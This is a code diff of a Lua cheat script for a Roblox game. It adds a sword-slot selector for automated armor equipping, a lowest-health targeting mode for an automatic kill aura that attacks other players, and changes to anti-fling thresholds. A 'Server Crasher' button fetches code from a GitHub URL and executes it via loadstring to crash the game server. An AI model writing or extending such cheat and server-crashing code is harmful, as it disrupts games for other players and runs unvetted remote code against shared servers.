@@ -405,6 +405,12 @@ AutoArmorDeluxeGroup:AddSlider("ToiletBedSpeed", {
 
 AutoArmorDeluxeGroup:AddDivider()
 
+AutoArmorDeluxeGroup:AddDropdown("AutoArmorSlot", {
+	Text = "Sword Slot",
+	Values = {"1", "2", "3", "4", "5", "6", "7", "8", "9"},
+	Default = "5",
+})
+
 AutoArmorDeluxeGroup:AddButton({
 	Text = "Bluesteel",
 	Func = function()
@@ -415,6 +421,7 @@ AutoArmorDeluxeGroup:AddButton({
 
 		local buildRemote = TSG.BuildRemote
 		local craftRemote = TSG.CraftRemote
+		local armorSlot = tonumber(Options.AutoArmorSlot and Options.AutoArmorSlot.Value) or 5
 		local equipHotbarRemote = TSG.EquipHotbarRemote
 		local equipClothingRemote = TSG.EquipClothingRemote
 		local deleteRemote = TSG.DeleteStructureRemote
@@ -426,7 +433,7 @@ AutoArmorDeluxeGroup:AddButton({
 
 		if Toggles.ArmorEquipOnly and Toggles.ArmorEquipOnly.Value then
 			pcall(function()
-				equipHotbarRemote:InvokeServer("inventory", 5, 197)
+				equipHotbarRemote:InvokeServer("inventory", armorSlot, 197)
 			end)
 			pcall(function()
 				equipClothingRemote:InvokeServer("inventory", 1, 202)
@@ -481,7 +488,7 @@ AutoArmorDeluxeGroup:AddButton({
 			task.wait(0.3)
 
 			pcall(function()
-				equipHotbarRemote:InvokeServer("inventory", 5, 197)
+				equipHotbarRemote:InvokeServer("inventory", armorSlot, 197)
 			end)
 			pcall(function()
 				equipClothingRemote:InvokeServer("inventory", 1, 202)
@@ -514,6 +521,7 @@ AutoArmorDeluxeGroup:AddButton({
 
 		local buildRemote = TSG.BuildRemote
 		local craftRemote = TSG.CraftRemote
+		local armorSlot = tonumber(Options.AutoArmorSlot and Options.AutoArmorSlot.Value) or 5
 		local equipHotbarRemote = TSG.EquipHotbarRemote
 		local equipClothingRemote = TSG.EquipClothingRemote
 		local deleteRemote = TSG.DeleteStructureRemote
@@ -525,7 +533,7 @@ AutoArmorDeluxeGroup:AddButton({
 
 		if Toggles.ArmorEquipOnly and Toggles.ArmorEquipOnly.Value then
 			pcall(function()
-				equipHotbarRemote:InvokeServer("inventory", 5, 357)
+				equipHotbarRemote:InvokeServer("inventory", armorSlot, 357)
 			end)
 			pcall(function()
 				equipClothingRemote:InvokeServer("inventory", 1, 354)
@@ -583,7 +591,7 @@ AutoArmorDeluxeGroup:AddButton({
 			task.wait(0.3)
 
 			pcall(function()
-				equipHotbarRemote:InvokeServer("inventory", 5, 357)
+				equipHotbarRemote:InvokeServer("inventory", armorSlot, 357)
 			end)
 			pcall(function()
 				equipClothingRemote:InvokeServer("inventory", 1, 354)
@@ -616,6 +624,7 @@ AutoArmorDeluxeGroup:AddButton({
 
 		local buildRemote = TSG.BuildRemote
 		local craftRemote = TSG.CraftRemote
+		local armorSlot = tonumber(Options.AutoArmorSlot and Options.AutoArmorSlot.Value) or 5
 		local equipHotbarRemote = TSG.EquipHotbarRemote
 		local equipClothingRemote = TSG.EquipClothingRemote
 		local deleteRemote = TSG.DeleteStructureRemote
@@ -627,7 +636,7 @@ AutoArmorDeluxeGroup:AddButton({
 
 		if Toggles.ArmorEquipOnly and Toggles.ArmorEquipOnly.Value then
 			pcall(function()
-				equipHotbarRemote:InvokeServer("inventory", 5, 267)
+				equipHotbarRemote:InvokeServer("inventory", armorSlot, 267)
 			end)
 			pcall(function()
 				equipClothingRemote:InvokeServer("inventory", 1, 262)
@@ -682,7 +691,7 @@ AutoArmorDeluxeGroup:AddButton({
 			task.wait(0.3)
 
 			pcall(function()
-				equipHotbarRemote:InvokeServer("inventory", 5, 267)
+				equipHotbarRemote:InvokeServer("inventory", armorSlot, 267)
 			end)
 			pcall(function()
 				equipClothingRemote:InvokeServer("inventory", 1, 262)
@@ -715,6 +724,7 @@ AutoArmorDeluxeGroup:AddButton({
 
 		local buildRemote = TSG.BuildRemote
 		local craftRemote = TSG.CraftRemote
+		local armorSlot = tonumber(Options.AutoArmorSlot and Options.AutoArmorSlot.Value) or 5
 		local equipHotbarRemote = TSG.EquipHotbarRemote
 		local equipClothingRemote = TSG.EquipClothingRemote
 		local deleteRemote = TSG.DeleteStructureRemote
@@ -726,7 +736,7 @@ AutoArmorDeluxeGroup:AddButton({
 
 		if Toggles.ArmorEquipOnly and Toggles.ArmorEquipOnly.Value then
 			pcall(function()
-				equipHotbarRemote:InvokeServer("inventory", 5, 406)
+				equipHotbarRemote:InvokeServer("inventory", armorSlot, 406)
 			end)
 			pcall(function()
 				equipClothingRemote:InvokeServer("inventory", 1, 404)
@@ -783,7 +793,7 @@ AutoArmorDeluxeGroup:AddButton({
 			task.wait(0.3)
 
 			pcall(function()
-				equipHotbarRemote:InvokeServer("inventory", 5, 406)
+				equipHotbarRemote:InvokeServer("inventory", armorSlot, 406)
 			end)
 			pcall(function()
 				equipClothingRemote:InvokeServer("inventory", 1, 404)
@@ -816,6 +826,7 @@ AutoArmorDeluxeGroup:AddButton({
 
 		local buildRemote = TSG.BuildRemote
 		local craftRemote = resolvePath(ReplicatedStorage, "remoteInterface", "interactions", "craft")
+		local armorSlot = tonumber(Options.AutoArmorSlot and Options.AutoArmorSlot.Value) or 5
 		local equipHotbarRemote = TSG.EquipHotbarRemote
 		local equipClothingRemote = TSG.EquipClothingRemote
 		local deleteRemote = TSG.DeleteStructureRemote
@@ -827,7 +838,7 @@ AutoArmorDeluxeGroup:AddButton({
 
 		if Toggles.ArmorEquipOnly and Toggles.ArmorEquipOnly.Value then
 			pcall(function()
-				equipHotbarRemote:InvokeServer("inventory", 5, 545)
+				equipHotbarRemote:InvokeServer("inventory", armorSlot, 545)
 			end)
 			pcall(function()
 				equipClothingRemote:InvokeServer("inventory", 1, 541)
@@ -888,7 +899,7 @@ AutoArmorDeluxeGroup:AddButton({
 			task.wait(0.3)
 
 			pcall(function()
-				equipHotbarRemote:InvokeServer("inventory", 5, 545)
+				equipHotbarRemote:InvokeServer("inventory", armorSlot, 545)
 			end)
 			pcall(function()
 				equipClothingRemote:InvokeServer("inventory", 1, 541)
@@ -939,12 +950,13 @@ Toggles.AtlanteanAutoSwap:OnChanged(function()
 		local function equipAtlantean()
 			local equipHotbarRemote = TSG.EquipHotbarRemote
 			local equipClothingRemote = TSG.EquipClothingRemote
+			local armorSlot = tonumber(Options.AutoArmorSlot and Options.AutoArmorSlot.Value) or 5
 			if not equipHotbarRemote or not equipClothingRemote then return end
 			local speed = (Options.AtlanteanEquipSpeed and Options.AtlanteanEquipSpeed.Value) or 20
 			local delay = 1 / math.max(0.1, speed)
 			task.spawn(function()
 				pcall(function()
-					equipHotbarRemote:InvokeServer("inventory", 5, 357)
+					equipHotbarRemote:InvokeServer("inventory", armorSlot, 357)
 				end)
 				task.wait(delay)
 				pcall(function()
@@ -1258,6 +1270,8 @@ FunLeft:AddDropdown("HelicopterPlayerList", {
 	Default = "",
 })
 
+FunLeft:AddDivider()
+
 FunLeft:AddCheckbox("AntiFling", {
 	Text = "Anti Fling",
 	Default = false,
@@ -1526,16 +1540,16 @@ MainRight:AddButton({
 })
 
 MainRight:AddButton({
-	Text = "Crash Server(Powerful)",
+	Text = "Server Crasher",
 	Func = function()
 		local ok, err = pcall(function()
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/sobachgroi67-cpu/idkgscripts/refs/heads/main/gscripts"))()
 		end)
 		if not ok then
-			Library:Notify({ Title = "Crash Server(Powerful)", Description = "Failed: " .. tostring(err), Time = 3 })
+			Library:Notify({ Title = "Server Crasher", Description = "Failed: " .. tostring(err), Time = 3 })
 			return
 		end
-		Library:Notify({ Title = "Crash Server(Powerful)", Description = "Loaded", Time = 2 })
+		Library:Notify({ Title = "Server Crasher", Description = "Loaded", Time = 2 })
 	end,
 })
 
@@ -2192,6 +2206,11 @@ CombatLeft:AddDropdown("KillAuraTarget", {
 	Text = "Target Player",
 	Values = {"All"},
 	Default = "All",
+})
+
+CombatLeft:AddCheckbox("LowestHP", {
+	Text = "Lowest HP",
+	Default = false,
 })
 
 CombatLeft:AddDropdown("KillAuraSlot", {
@@ -3025,6 +3044,9 @@ local function killAuraLoop()
 	end
 
 	local targetSetting = Options.KillAuraTarget and Options.KillAuraTarget.Value or "All"
+	local useLowestHP = Toggles.LowestHP and Toggles.LowestHP.Value
+	local lowestHealth = math.huge
+	local lowestHPTarget = nil
 
 	-- Scan Players
 	for _, otherPlayer in ipairs(Players:GetPlayers()) do
@@ -3034,13 +3056,24 @@ local function killAuraLoop()
 			if otherHum and otherHum.Health > 0 and otherRoot then
 				if targetSetting == "All" or otherPlayer.Name == targetSetting then
 					local d = (otherRoot.Position - pos).Magnitude
-					if d < nearestDist and passesAngleCheck(otherRoot.Position) then
-						nearestDist = d
-						nearestTarget = otherPlayer.Character
+					if d < range and passesAngleCheck(otherRoot.Position) then
+						if useLowestHP then
+							if otherHum.Health < lowestHealth then
+								lowestHealth = otherHum.Health
+								lowestHPTarget = otherPlayer.Character
+							end
+						elseif d < nearestDist then
+							nearestDist = d
+							nearestTarget = otherPlayer.Character
+						end
 					end
 				end
 			end
 		end
+	end
+
+	if useLowestHP then
+		nearestTarget = lowestHPTarget
 	end
 
 	if not nearestTarget then
@@ -8017,11 +8050,12 @@ Toggles.AntiFling:OnChanged(function()
 			if not char then return end
 			local root = char:FindFirstChild("HumanoidRootPart")
 			if not root then return end
-			-- Kill the velocity spikes fling scripts depend on
-			if root.AssemblyLinearVelocity.Magnitude > 100 then
+			-- Fling threshold sits above normal falling speed (freefall caps around 200 studs/s)
+			-- so only real fling launches (~1000+ studs/s) are cancelled
+			if root.AssemblyLinearVelocity.Magnitude > 300 then
 				root.AssemblyLinearVelocity = Vector3.zero
 			end
-			if root.AssemblyAngularVelocity.Magnitude > 50 then
+			if root.AssemblyAngularVelocity.Magnitude > 300 then
 				root.AssemblyAngularVelocity = Vector3.zero
 			end
 		end))
